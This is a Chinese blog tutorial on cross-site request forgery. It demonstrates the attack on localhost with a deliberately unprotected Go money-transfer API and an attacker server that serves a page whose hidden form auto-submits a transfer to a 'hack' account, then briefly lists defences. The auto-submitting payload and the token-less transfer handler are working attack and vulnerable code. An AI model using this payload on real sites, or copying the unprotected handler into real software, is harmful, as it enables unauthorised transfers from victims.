---
title: "Web Safe Csrf"
date: 2021-09-16T22:43:44+08:00
---

## 概 述

随着互联网的高速发展，信息安全问题已经成为企业最为关注的焦点之一，而前端又是引发企业安全问题的高危据点。在移动互联网时代，前端人员除了传统的 `XSS`、`CSRF` 等安全问题之外，又时常遭遇网络劫持、非法调用 `API` 等新型安全问题。当然，浏览器自身也在不断在进化和发展，不断引入 `CSP`、`Same-Site Cookies` 等新技术来增强安全性，但是仍存在很多潜在的威胁，这需要我们技术人员不断对系统进行“查漏补缺”。


## 废话少说，先看问题

为了模拟问题我这边用`go`写了`2`个服务端的代码，正常交易系统的API，当然这里只是为了`演示漏洞利用`，代码比较简单如下:

**transaction.go 内容:**

```go
package main

import (
    "errors"
    "fmt"
    "github.com/spf13/cast"
    "log"
    "net/http"
)

// 模拟数据存储
type user struct {
    id    string
    money int
}

var userdata []*user

func init() {
    userdata = append(userdata, &user{id: "Tom", money: 10000})
    userdata = append(userdata, &user{id: "John", money: 10000})
    userdata = append(userdata, &user{id: "hack", money: 0})
}

// 模拟交易系统API
func main() {
    http.HandleFunc("/transaction", transactionHandler)
    http.ListenAndServe(":1999", nil)
}

// 假设这是交易处理器
func transactionHandler(w http.ResponseWriter, req *http.Request) {
    if req.URL.Path != "/transaction" {
          http.Error(w, "404 not found.", http.StatusNotFound)
          return
    }
    switch req.Method {
    case "GET":
          http.ServeFile(w, req, "form.html")
    case "POST":
      if err := req.ParseForm(); err != nil {
          fmt.Fprintf(w, "ParseForm() err: %v", err)
          return
      }
      if e := transaction(req.FormValue("Id"), req.FormValue("toId"), req.FormValue("money")); e != nil {
          fmt.Fprintf(w,"%s",e.Error())
          return
      }
      fmt.Fprintf(w,"transaction successful.")
    default:
      fmt.Fprintf(w, "Sorry, only GET and POST methods are supported.")
    }
}

func transaction(Id, toId, money string) error {

	if len(Id) <= 0 || len(toId) <= 0 || cast.ToInt(money) <= 0 {
      return errors.New("form invalid parameter")
	}
	var user, recipient *user
	for _, u := range userdata {
      if u.id == Id {
          user = u
          break
      }
	}
	for _, r := range userdata {
      if r.id == toId {
          recipient = r
          break
      }
	}
	// 用户不存在
	if user == nil || recipient == nil {
      return errors.New("user does not exist")
	}
	// 有钱才能转账
	if user.money < 0 || user.money < cast.ToInt(money) {
      return errors.New("your balance is insufficient")
	}
	user.money = user.money - cast.ToInt(money)
	recipient.money = recipient.money + cast.ToInt(money)
	log.Printf("用户 %s 向用户 %s 转账 %s 元.", Id, toId, money)
	return nil
}

```

我们把上面的代码跑起来，`go run transaction.go`

```
[Running] go run "/Users/ding/Desktop/CSRF_Demo/transaction.go"
2021/03/12 21:50:08 Transaction Server Running....
```
好了，服务器正常跑起来了，按照我们正常的系统流程是，我们登陆到了系统里面，系统里面有我们的浏览器会话数据，这时我们只想通过系统给出的交易接口操作就可以了，这里为了方便演示我使用`postman`进行测试。

![操作截图](https://tva1.sinaimg.cn/large/008eGmZEgy1gohgs1l2eij30qi0huabj.jpg)

可以看到我们的交易系统设计的所需的参数，并且我们填写了请求表单数据，并且提交了这个请求。我们去服务器看看日志:

```
[Running] go run "/Users/ding/Desktop/CSRF_Demo/transaction.go"
2021/03/12 21:50:08 Transaction Server Running....
2021/03/12 21:54:41 用户 Tom 向用户 John 转账 2000 元.
```
可以看到有一条转账记录，说明我们操作成功了。


## 开始漏洞利用

按照正常人的思维我们就正常操作就行了，但是世界这么大怎么可能没有坏人呢？？？那下面把第一个服务器跑起来，并且访问第二个服务器看看结果怎么样？？

**csrf.go文件里面内容:**

```go
package main

import (
    "log"
    "net/http"
)

func main(){
    http.HandleFunc("/csrf",csrfHandler)
    log.Println("CSRF Server Running....")
    http.ListenAndServe(":2021", nil)
}

func csrfHandler(writer http.ResponseWriter, request *http.Request) {
    http.ServeFile(writer, request, "csrf.html")
}
```

首先我把攻击利用服务器启动 `go run csrf.go`

```go
2021/03/12 22:16:43 CSRF Server Running....
```

然后我在同一浏览器里面访问这个地址`http://127.0.0.1:2021/csrf`。

![攻击利用](https://tva1.sinaimg.cn/large/008eGmZEgy1gohhhxzpwhj30gi02s3yo.jpg)

在你回车的那一秒，其实这个漏洞已经利用成功了。这个过程可能不是你直接在浏览器地址框直接输入，也可能是你在打开其他网站，其他网站里面有一个地址就是这个地址，或者是你在`QQ`或者一些聊天软件上，别人给你发送一个地址，在你点击那一秒这个攻击就成功了。

那怎么证明成功了呢？我们去看看转账系统的日志。。

![日志记录](https://tva1.sinaimg.cn/large/008eGmZEgy1gohhlco3g6j30m704ojs0.jpg)

可以看到有一条转账日志记录，这就是我们刚刚通过漏洞利用达成的转账效果。

## 那这个是怎么做到的呢？

通过我们攻击利用服务器上的代码可以看出来我们在服务器返回了一个`csrf.html`文件，那这个文件做了什么？？？

**文件内容如下:**

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>csrf 攻击演示</title>
</head>
<body>
<form action="http://127.0.0.01:1999/transaction" method=POST>
    <input type="hidden" name="Id" value="Tom" />
    <input type="hidden" name="money" value="5000" />
    <input type="hidden" name="toId" value="hack" />
</form>
<script> document.forms[0].submit(); </script>
</body>
</html>
```
相信是个程序员都能看懂我做了什么吧，不用细说。


## CSRF攻击和防范

上面攻击过程就是我们常说的`CSRF`攻击，相比`XSS`，`CSRF`的名气似乎并不是那么大，很多人都认为`CSRF`“`不那么有破坏性`”，真的是这样吗？

`CSRF`攻击的例子已经不是单个个例了，`Gmail，Facebook，Twitter，YouTube`这些都有个类似的漏洞事件。

- https://www.davidairey.com/google-gmail-security-hijack/

> `CSRF（Cross-site request forgery）`跨站请求伪造：攻击者诱导受害者进入第三方网站，在第三方网站中，向被攻击网站发送跨站请求。利用受害者在被攻击网站已经获取的注册凭证，绕过后台的用户验证，达到冒充用户对被攻击的网站执行某项操作的目的。

![CSRF攻击原理图
](https://tva1.sinaimg.cn/large/008eGmZEgy1gohdrs7ja5j30tg0gyta4.jpg)

我刚才的例子就是一个典型的`CSRF`例子，受害者登录`a.com`，并保留了登录凭证`（Cookie）`，攻击者引诱受害者访问了`b.com`，`b.com` 向 `a.com` 发送了一个请求：`a.com/xx`。浏览器会默认携带a`.com`的`Cookie`，`a.com`接收到请求后，对请求进行验证，并确认是受害者的凭证，误以为是受害者自己发送的请求，从而达到黑客的目的。

## 小 结

涉及到铭感数据操作的加强验证，客户端的数据不可信，服务器加强对数据校验，和加一些`风控`策略，例如`验证码，手机短信，jwt`，或者第三方验证码防火墙，也可以在请求的之前先拿到一个唯一的`token`，同源检测（`Origin` 和 `Referer` 验证），当然这些方法还不安全，如果有空会续更。